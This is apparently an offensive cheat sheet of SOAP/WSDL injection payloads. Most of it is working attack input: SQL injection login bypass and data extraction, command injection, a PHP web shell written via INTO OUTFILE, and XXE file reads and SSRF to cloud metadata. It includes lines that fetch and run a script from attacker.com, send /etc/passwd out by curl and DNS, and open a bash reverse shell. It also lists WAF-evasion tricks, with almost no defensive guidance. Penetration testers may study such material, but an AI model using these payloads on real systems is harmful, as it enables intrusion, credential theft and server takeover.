### SOAP WSDL Injection (XML/SOAP SQLi & Command Execution)

SOAP WSDL Injection is an attack technique that exploits vulnerabilities in SOAP-based web services, particularly when user input within SOAP messages is improperly handled. This can lead to SQL injection, command execution, XML injection, and more.

* **How It Works:** SOAP messages are XML-based. If input fields like `<username>` or `<password>` are directly concatenated into backend SQL queries or system commands without sanitization, attackers can inject malicious payloads.
* **Common Entry Points:** SOAP action endpoints, WSDL-defined operations, XML parameters within `<soap:Body>`.
* **Impact:** Unauthorized access, data leakage, remote code execution, denial of service.

-----

### Basic SOAP SQL Injection Payloads

#### Authentication Bypass via SOAP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <LoginRequest>
            <username>admin' OR '1'='1</username>
            <password>anything</password>
        </LoginRequest>
    </soap:Body>
</soap:Envelope>
```

* **Why it's used:** To bypass login logic by making the SQL condition always true.
* **How it works:** The `' OR '1'='1` closes the string and adds a true condition, often returning the first user.

#### UNION-Based Data Extraction via SOAP

```xml
<username>admin' UNION SELECT 1,2,3 -- -</username>
```

* **Why it's used:** To extract data by appending a UNION query.
* **How it works:** The UNION operator merges results from another SELECT statement, allowing data exfiltration.

#### Comment-Based SQL Injection in SOAP

```xml
<username>admin' --</username>
<password>anything</password>
```

* **Why it's used:** To comment out the rest of the SQL query.
* **How it works:** The `--` sequence comments out the password check in the SQL query.

-----

### SOAP-Based Command Injection (RCE)

#### Basic Command Injection via SOAP

```xml
<username>admin' OR 1=1; id; -- -</username>
```

* **Why it's used:** To execute shell commands if input is passed to `system()` or `exec()`.
* **How it works:** The semicolon allows command chaining in Unix systems.

#### Command Injection with Argument Chaining

```xml
<filename>../../etc/passwd; cat /etc/shadow</filename>
```

* **Why it's used:** To chain multiple commands in file operation parameters.
* **How it works:** Using shell operators like `;`, `&`, `|`, or `&&` to execute additional commands.

#### Remote Code Execution via SOAP Parameters

```xml
<command>ping 127.0.0.1 && curl http://attacker.com/shell.sh | bash</command>
```

* **Why it's used:** When SOAP operations execute system commands directly.
* **How it works:** Injecting shell commands that download and execute malicious scripts.

-----

### File Operations via SOAP Injection

#### Reading Files via SOAP SQL Injection

```xml
<username>admin' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 -- -</username>
```

* **Why it's used:** To read local files if the database supports `LOAD_FILE()`.
* **How it works:** The file content is returned as a column in the query result.

#### File Write/Web Shell Upload

```xml
<username>admin' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php' -- -</username>
```

* **Why it's used:** To upload a backdoor for persistent access.
* **How it works:** Using `INTO OUTFILE` to write arbitrary content to a web-accessible directory.

-----

### Advanced SOAP Injection: XXE via SOAP

#### XXE Injection in SOAP Body

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <LoginRequest>
            <username>&xxe;</username>
            <password>123</password>
        </LoginRequest>
    </soap:Body>
</soap:Envelope>
```

* **Why it's used:** To read local files via XML External Entity (XXE) injection.
* **How it works:** The `&xxe;` entity references the external file, which is included in the SOAP response.

#### XXE for SSRF via SOAP

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<username>&xxe;</username>
```

* **Why it's used:** To perform Server-Side Request Forgery (SSRF) and access internal services.
* **How it works:** The SOAP server makes a request to the internal URL and returns the response.

#### XXE Data Exfiltration via HTTP

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<username>&exfil;</username>
```

* **Why it's used:** To exfiltrate file contents via HTTP requests.
* **How it works:** Using parameter entities to send file content to an attacker-controlled server.

-----

### SOAP WSDL Enumeration & Discovery

#### WSDL Enumeration via SOAP Action

```http
POST /wsdl HTTP/1.1
Host: target.com
SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
Content-Type: text/xml

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <AddPortMapping>
            <NewRemoteHost></NewRemoteHost>
            <NewExternalPort>4444</NewExternalPort>
            <NewProtocol>TCP</NewProtocol>
            <NewInternalPort>4444</NewInternalPort>
            <NewInternalClient>192.168.1.100</NewInternalClient>
            <NewEnabled>1</NewEnabled>
            <NewPortMappingDescription>evil</NewPortMappingDescription>
            <NewLeaseDuration>0</NewLeaseDuration>
        </AddPortMapping>
    </soap:Body>
</soap:Envelope>
```

* **Why it's used:** To discover and interact with SOAP services, potentially leading to command injection.
* **How it works:** SOAP actions may map to backend functions that handle system commands.

#### WSDL Information Disclosure

```http
GET /service.asmx?wsdl HTTP/1.1
Host: target.com
```

* **Why it's used:** To obtain the WSDL definition file containing all available operations.
* **How it works:** WSDL files describe the SOAP service interface, exposing all methods and parameters.

-----

### Real-World SOAP Injection Examples

#### Case Study: SAP SOAP Injection (CVE-2018-2380)

* **What happened:** SOAP injection in SAP NetWeaver allowed attackers to execute arbitrary SQL queries.
* **How it worked:** Attackers injected SQL into SOAP XML parameters, leading to data exfiltration and system compromise.

#### Example: SOAP Login Bypass

```http
POST /LoginService.asmx HTTP/1.1
SOAPAction: "http://tempuri.org/Login"
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://tempuri.org/">
      <username>admin' --</username>
      <password>anything</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

* **Result:** The SQL query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
Logging in as admin without a password.

#### SOAP Injection with Error-Based SQLi

```xml
<username>admin' AND 1=CONVERT(int, (SELECT @@version)) --</username>
```

* **Why it's used:** To extract database version information through error messages.
* **How it works:** Triggering type conversion errors that include sensitive data in the error response.

-----

### Bypassing SOAP Web Application Firewalls (WAFs)

#### Case Variation and Encoding

```xml
<username>AdMiN' Or '1'='1</username>
```

* **Why it's used:** To bypass case-sensitive WAF rules.
* **How it works:** Alternating letter casing to avoid keyword detection.

#### XML Comment Injection

```xml
<username>admin'<!-- XML comment --> OR '1'='1</username>
```

* **Why it's used:** To break up SQL keywords within XML.
* **How it works:** Inserting XML comments between SQL keywords to evade pattern matching.

#### Hex Encoding in SOAP

```xml
<username>admin' OR 0x31=0x31 --</username>
```

* **Why it's used:** To encode payloads and bypass string-based filters.
* **How it works:** Using hex representation of characters to hide malicious keywords.

#### CDATA Section Bypass

```xml
<username><![CDATA[admin' OR '1'='1]]></username>
```

* **Why it's used:** CDATA sections may be processed differently by parsers and WAFs.
* **How it works:** Embedding payload within CDATA sections to avoid XML parsing.

-----

### Advanced Data Exfiltration Techniques via SOAP

#### Time-Based Data Exfiltration via SOAP

```xml
<username>admin' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64, SLEEP(5), 0) --</username>
```

* **Why it's used:** When traditional data return is blocked or monitored.
* **How it works:** Using time delays to infer data character by character.

#### DNS-Based Exfiltration via SOAP

```xml
<username>admin' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --</username>
```

* **Why it's used:** To bypass network restrictions and exfiltrate data via DNS queries.
* **How it works:** Forcing the database to resolve a domain containing stolen data.

#### HTTP Request Exfiltration

```xml
<command>curl http://attacker.com/?data=$(cat /etc/passwd | base64)</command>
```

* **Why it's used:** When the server can make outbound HTTP requests.
* **How it works:** Using system commands to send HTTP requests containing stolen data.

-----

### Advanced SOAP Attack Scenarios

#### Second-Order SOAP Injection

```xml
<!-- First request - store malicious payload -->
<username>admin' --</username>

<!-- Second request - trigger the stored payload -->
<resetToken>stored_token_from_previous_request</resetToken>
```

* **Why it's used:** When input is stored and later used in a query without sanitization.
* **How it works:** The attacker injects payloads that are harmless when stored but become active when retrieved.

#### SOAP Action Spoofing

```http
POST /service.asmx HTTP/1.1
Host: target.com
SOAPAction: "http://tempuri.org/AdminDeleteAllData"
Content-Type: text/xml
```

* **Why it's used:** To invoke privileged operations by guessing or discovering SOAP actions.
* **How it works:** Changing the SOAPAction header to target different backend methods.

#### WSDL Scanning for Hidden Operations

```bash
# Extract all operations from WSDL
curl -s http://target.com/service.asmx?wsdl | grep -o 'operation name="[^"]*"' | cut -d'"' -f2
```

* **Why it's used:** To discover undocumented or administrative SOAP operations.
* **How it works:** Parsing the WSDL file to enumerate all available service methods.

#### SOAP Array Injection

```xml
<items>
    <item>normal</item>
    <item>malicious' OR '1'='1</item>
    <item>normal</item>
</items>
```

* **Why it's used:** When SOAP arrays are processed item by item.
* **How it works:** Injecting malicious payloads into array elements that might be processed individually.

-----

### Complete SOAP Attack Payload Collection

#### SQL Injection Payloads

```xml
<!-- Basic authentication bypass -->
<username>admin' OR '1'='1</username>

<!-- Union-based extraction -->
<username>admin' UNION SELECT 1,@@version,3 --</username>

<!-- Error-based injection -->
<username>admin' AND 1=CONVERT(int, (SELECT @@version)) --</username>

<!-- Time-based blind injection -->
<username>admin' AND IF(1=1, SLEEP(5), 0) --</username>
```

#### Command Injection Payloads

```xml
<!-- Basic command injection -->
<filename>test.txt; whoami</filename>

<!-- Command chaining -->
<command>ping 127.0.0.1 && cat /etc/passwd</command>

<!-- Reverse shell -->
<command>bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'</command>
```

#### XXE Payloads

```xml
<!-- File read -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!-- SSRF -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>

<!-- Data exfiltration -->
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
```

#### WSDL Discovery Queries

```http
<!-- Get WSDL -->
GET /service.asmx?wsdl HTTP/1.1

<!-- Get single operation WSDL -->
GET /service.asmx?op=GetUser&wsdl HTTP/1.1

<!-- Test SOAP action -->
POST /service.asmx HTTP/1.1
SOAPAction: "http://tempuri.org/TestMethod"
```

-----

**Made with love by VIsh0k**